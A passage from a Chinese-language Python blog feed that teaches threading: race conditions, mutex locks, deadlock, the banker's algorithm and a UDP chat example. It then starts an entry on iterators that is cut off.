class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"----in work1, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"----in work2, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"---线程创建之前g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=work1, args=(<span class="number">1000000</span>,))</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># time.sleep(5) # 可加延时确保t1先执行完</span></span><br><span class="line"></span><br><span class="line">t2 = threading.Thread(target=work2, args=(<span class="number">1000000</span>,))</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(threading.enumerate()) != <span class="number">1</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"2个线程对同一个全局变量操作之后的最终结果是:%s"</span> % g_num)</span><br></pre></td></tr></table></figure><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---线程创建之前g_num is 0---</span><br><span class="line">----<span class="keyword">in</span> work2, g_num is 1306621---</span><br><span class="line">----<span class="keyword">in</span> work1, g_num is 1329573---</span><br><span class="line">2个线程对同一个全局变量操作之后的最终结果是:1329573</span><br></pre></td></tr></table></figure><p></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>如果多个线程同时对同一个全局变量操作，会出现资源竞争问题，从而数据结果会不正确</li></ul><h1 id="同步的概念"><a href="#同步的概念" class="headerlink" title="同步的概念"></a>同步的概念</h1><p>同步就是协同步调，按预定的先后次序进行运行。如:你说完，我再说。<br>“同”字从字面上容易理解为一起动作,其实不是，”同”字应是指协同、协助、互相配合。<br>如进程、线程同步，可理解为进程或线程A和B一块配合，A执行到一定程度时要依靠B的某个结果，于是停下来，示意B运行;B执行，再将结果给A;A再继续操作。</p><h2 id="解决线程同时修改全局变量的方式"><a href="#解决线程同时修改全局变量的方式" class="headerlink" title="解决线程同时修改全局变量的方式"></a>解决线程同时修改全局变量的方式</h2><p>可以通过线程同步来进行解决,思路如下:</p><ol><li>系统调用t1，然后获取到g_num的值为0，此时上一把锁，即不允许其他线程操作g_num</li><li>t1对g_num的值进行+1</li><li>t1解锁，此时g_num的值为1，其他的线程就可以使用g_num了，而且是g_num的值不是0而是1</li><li>同理其他线程在对g_num进行修改时，都要先上锁，处理完后再解锁，在上锁的整个过程中不允许其他线程访问，就保证了数据的正确性</li></ol><h1 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h1><p>当多个线程几乎同时修改某一个共享数据的时候，需要进行同步控制<br>线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入互斥锁。<br>互斥锁为资源引入一个状态：锁定/非锁定<br>某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。</p><p>threading模块中定义了Lock类，可以方便的处理锁定：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建锁</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"><span class="comment"># 锁定</span></span><br><span class="line">mutex.acquire()</span><br><span class="line"><span class="comment"># 释放</span></span><br><span class="line">mutex.release()</span><br></pre></td></tr></table></figure><p></p><p>注意：</p><ul><li>如果这个锁之前是没有上锁的，那么acquire不会堵塞</li><li>如果在调用acquire对这个锁上锁之前 它已经被 其他线程上了锁，那么此时acquire会堵塞，直到这个锁被解锁为止</li></ul><h2 id="使用互斥锁完成2个线程对同一个全局变量各加100万次的操作"><a href="#使用互斥锁完成2个线程对同一个全局变量各加100万次的操作" class="headerlink" title="使用互斥锁完成2个线程对同一个全局变量各加100万次的操作"></a>使用互斥锁完成2个线程对同一个全局变量各加100万次的操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        mutex.acquire()  <span class="comment"># 上锁</span></span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">        mutex.release()  <span class="comment"># 解锁</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"---test1---g_num=%d"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        mutex.acquire()  <span class="comment"># 上锁</span></span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">        mutex.release()  <span class="comment"># 解锁</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"---test2---g_num=%d"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个互斥锁</span></span><br><span class="line"><span class="comment"># 默认是未上锁的状态</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建2个线程，让他们各自对g_num加1000000次</span></span><br><span class="line">p1 = threading.Thread(target=test1, args=(<span class="number">1000000</span>,))</span><br><span class="line">p1.start()</span><br><span class="line"></span><br><span class="line">p2 = threading.Thread(target=test2, args=(<span class="number">1000000</span>,))</span><br><span class="line">p2.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待计算完成</span></span><br><span class="line"><span class="keyword">while</span> len(threading.enumerate()) != <span class="number">1</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"2个线程对同一个全局变量操作之后的最终结果是:%s"</span> % g_num)</span><br></pre></td></tr></table></figure><p>运行结果：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---test1---g_num=1940444</span><br><span class="line">---test2---g_num=2000000</span><br><span class="line">2个线程对同一个全局变量操作之后的最终结果是:2000000</span><br></pre></td></tr></table></figure><p></p><p>可以看到最后的结果，加入互斥锁后，其结果与预期相符。</p><h2 id="上锁解锁过程"><a href="#上锁解锁过程" class="headerlink" title="上锁解锁过程"></a>上锁解锁过程</h2><p>当一个线程调用锁的acquire()方法获得锁时，锁就进入“locked”状态。<br>每次只有一个线程可以获得锁。如果此时另一个线程试图获得这个锁，该线程就会变为“blocked”状态，称为“阻塞”，直到拥有锁的线程调用锁的release()方法释放锁之后，锁进入“unlocked”状态。<br>线程调度程序从处于同步阻塞状态的线程中选择一个来获得锁，并使得该线程进入运行（running）状态。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>锁的好处：</p><ul><li>确保了某段关键代码只能由一个线程从头到尾完整地执行<br>锁的坏处：</li><li>阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了</li><li>由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁</li></ul><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p>在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。<br>尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 对mutexA上锁</span></span><br><span class="line">        mutexA.acquire()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># mutexA上锁后，延时1秒，等待另外那个线程 把mutexB上锁</span></span><br><span class="line">        print(self.name+<span class="string">'----do1---up----'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 此时会堵塞，因为这个mutexB已经被另外的线程抢先上锁了</span></span><br><span class="line">        mutexB.acquire()</span><br><span class="line">        print(self.name+<span class="string">'----do1---down----'</span>)</span><br><span class="line">        mutexB.release()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对mutexA解锁</span></span><br><span class="line">        mutexA.release()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread2</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 对mutexB上锁</span></span><br><span class="line">        mutexB.acquire()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># mutexB上锁后，延时1秒，等待另外那个线程 把mutexA上锁</span></span><br><span class="line">        print(self.name+<span class="string">'----do2---up----'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 此时会堵塞，因为这个mutexA已经被另外的线程抢先上锁了</span></span><br><span class="line">        mutexA.acquire()</span><br><span class="line">        print(self.name+<span class="string">'----do2---down----'</span>)</span><br><span class="line">        mutexA.release()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对mutexB解锁</span></span><br><span class="line">        mutexB.release()</span><br><span class="line"></span><br><span class="line">mutexA = threading.Lock()</span><br><span class="line">mutexB = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = MyThread1()</span><br><span class="line">    t2 = MyThread2()</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p></p><p>运行此代码会发现此时已经进入到了死锁状态，可以使用ctrl-c退出</p><h2 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h2><ul><li>程序设计时要尽量避免（银行家算法）</li><li>添加超时时间等</li></ul><p>附录-银行家算法</p><p>[背景知识]</p><p>一个银行家如何将一定数目的资金安全地借给若干个客户，使这些客户既能借到钱完成要干的事，同时银行家又能收回全部资金而不至于破产，这就是银行家问题。这个问题同操作系统中资源分配问题十分相似：银行家就像一个操作系统，客户就像运行的进程，银行家的资金就是系统的资源。</p><p>[问题的描述]</p><p>一个银行家拥有一定数量的资金，有若干个客户要贷款。每个客户须在一开始就声明他所需贷款的总额。若该客户贷款总额不超过银行家的资金总数，银行家可以接收客户的要求。客户贷款是以每次一个资金单位（如1万RMB等）的方式进行的，客户在借满所需的全部单位款额之前可能会等待，但银行家须保证这种等待是有限的，可完成的。</p><p>例如：有三个客户C1，C2，C3，向银行家借款，该银行家的资金总额为10个资金单位，其中C1客户要借9各资金单位，C2客户要借3个资金单位，C3客户要借8个资金单位，总计20个资金单位。某一时刻的状态如图所示。</p><p><img src="/images_xiancheng/001.png" alt></p><p>对于a图的状态，按照安全序列的要求，我们选的第一个客户应满足该客户所需的贷款小于等于银行家当前所剩余的钱款，可以看出只有C2客户能被满足：C2客户需1个资金单位，小银行家手中的2个资金单位，于是银行家把1个资金单位借给C2客户，使之完成工作并归还所借的3个资金单位的钱，进入b图。同理，银行家把4个资金单位借给C3客户，使其完成工作，在c图中，只剩一个客户C1，它需7个资金单位，这时银行家有8个资金单位，所以C1也能顺利借到钱并完成工作。最后（见图d）银行家收回全部10个资金单位，保证不赔本。那麽客户序列{C1，C2，C3}就是个安全序列，按照这个序列贷款，银行家才是安全的。否则的话，若在图b状态时，银行家把手中的4个资金单位借给了C1，则出现不安全状态：这时C1，C3均不能完成工作，而银行家手中又没有钱了，系统陷入僵持局面，银行家也不能收回投资。</p><p>综上所述，银行家算法是从当前状态出发，逐个按安全序列检查各客户谁能完成其工作，然后假定其完成工作且归还全部贷款，再进而检查下一个能完成工作的客户，……。如果所有客户都能完成工作，则找到一个安全序列，银行家才是安全的。</p><h1 id="案例：多任务版udp聊天器"><a href="#案例：多任务版udp聊天器" class="headerlink" title="案例：多任务版udp聊天器"></a>案例：多任务版udp聊天器</h1><p><img src="/images_xiancheng/002.png" alt></p><p>说明</p><ul><li>编写一个有2个线程的程序</li><li>线程1用来接收数据然后显示</li><li>线程2用来检测键盘数据然后通过udp发送数据</li></ul><p>参考代码:<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""获取键盘数据，并将其发送给对方"""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 1. 从键盘输入数据</span></span><br><span class="line">        msg = input(<span class="string">"\n请输入要发送的数据:"</span>)</span><br><span class="line">        <span class="comment"># 2. 输入对方的ip地址</span></span><br><span class="line">        dest_ip = input(<span class="string">"\n请输入对方的ip地址:"</span>)</span><br><span class="line">        <span class="comment"># 3. 输入对方的port</span></span><br><span class="line">        dest_port = int(input(<span class="string">"\n请输入对方的port:"</span>))</span><br><span class="line">        <span class="comment"># 4. 发送数据</span></span><br><span class="line">        udp_socket.sendto(msg.encode(<span class="string">"utf-8"</span>), (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""接收数据并显示"""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 1. 接收数据</span></span><br><span class="line">        recv_msg = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment"># 2. 解码</span></span><br><span class="line">        recv_ip = recv_msg[<span class="number">1</span>]</span><br><span class="line">        recv_msg = recv_msg[<span class="number">0</span>].decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        <span class="comment"># 3. 显示接收到的数据</span></span><br><span class="line">        print(<span class="string">"&gt;&gt;&gt;%s:%s"</span> % (str(recv_ip), recv_msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="comment"># 2. 绑定本地信息</span></span><br><span class="line">    udp_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 创建一个子线程用来接收数据</span></span><br><span class="line">    t = threading.Thread(target=recv_msg, args=(udp_socket,))</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="comment"># 4. 让主线程用来检测键盘数据并且发送</span></span><br><span class="line">    send_msg(udp_socket)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;多任务的概念&quot;&gt;&lt;a href=&quot;#多任务的概念&quot; class=&quot;headerlink&quot; title=&quot;多任务的概念&quot;&gt;&lt;/a&gt;多任务的概念&lt;/h1&gt;&lt;p&gt;简单地说，就是操作系统可以同时运行多个任务。&lt;/p&gt;&lt;p&gt;现在，多核CPU已经非常普及了，但是，即使过去的单核CPU，也可以执行多任务。由于CPU执行代码都是顺序执行的，那么，单核CPU是怎么执行多任务的呢？&lt;/p&gt;&lt;p&gt;答案就是操作系统轮流让各个任务交替执行，任务1执行0.01秒，切换到任务2，任务2执行0.01秒，再切换到任务3，执行0.01秒……这样反复执行下去。表面上看，每个任务都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像所有任务都在同时执行一样。&lt;/p&gt;&lt;p&gt;真正的并行执行多任务只能在多核CPU上实现，但是，由于任务数量远远多于CPU的核心数量，所以，操作系统也会自动把很多任务轮流调度到每个核心上执行。&lt;/p&gt;&lt;p&gt;注意：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;并发：指的是任务数多于cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）&lt;/li&gt;&lt;li&gt;并行：指的是任务数小于等于cpu核数，即任务真的是一起执行的&lt;/li&gt;&lt;/ul&gt;&lt;h1 id=&quot;线程&quot;&gt;&lt;a href=&quot;#线程&quot; class=&quot;headerlink&quot; title=&quot;线程&quot;&gt;&lt;/a&gt;线程&lt;/h1&gt;&lt;p&gt;python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用&lt;/p&gt;&lt;h2 id=&quot;使用threading模块&quot;&gt;&lt;a href=&quot;#使用threading模块&quot; class=&quot;headerlink&quot; title=&quot;使用threading模块&quot;&gt;&lt;/a&gt;使用threading模块&lt;/h2&gt;&lt;h3 id=&quot;单线程执行&quot;&gt;&lt;a href=&quot;#单线程执行&quot; class=&quot;headerlink&quot; title=&quot;单线程执行&quot;&gt;&lt;/a&gt;单线程执行&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#coding=utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;saySorry&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(&lt;span class=&quot;string&quot;&gt;&quot;亲爱的，我错了，我能吃饭了吗？&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    time.sleep(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        saySorry()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>多任务_协程</title>
    <link href="https://yongnights.github.io/2019/12/31/%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E5%8D%8F%E7%A8%8B/"/>
    <id>https://yongnights.github.io/2019/12/31/多任务_协程/</id>
    <published>2019-12-31T04:00:48.281Z</published>
    <updated>2019-12-31T04:00:48.282Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><blockquote><p>迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p></blockquote><h2 id="1-可迭代对象"><a href="#1-可迭代对象" class="headerlink" title="1. 可迭代对象"></a>1. 可迭代对象</h2><p>我们已经知道可以对list、tuple、str等类型的数据使用for…in…的循环语法从其中依次拿到数据进行使用，我们把这样的过程称为遍历，也叫<strong>迭代</strong>。</p><p><strong>但是，是否所有的数据类型都可以放到for…in…的语句中，然后让for…in…每次从中取出一条数据供我们使用，即供我们迭代吗？</strong></p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">100</span>:</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'int'</span> object <span class="keyword">is</span> <span class="keyword">not</span> iterable</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="comment"># int整型不是iterable，即int整型不是可以迭代的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们自定义一个容器MyList用来存放数据，可以通过add方法向其中添加数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyList</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            self.container = []</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line"><span class="meta">... </span>            self.container.append(item)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = MyList()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> num <span class="keyword">in</span> mylist:</span><br><span class="line"><span class="meta">... </span>    print(num)</span><br><span class="line">...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'MyList'</span> object <span class="keyword">is</span> <span class="keyword">not</span> iterable</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="comment"># 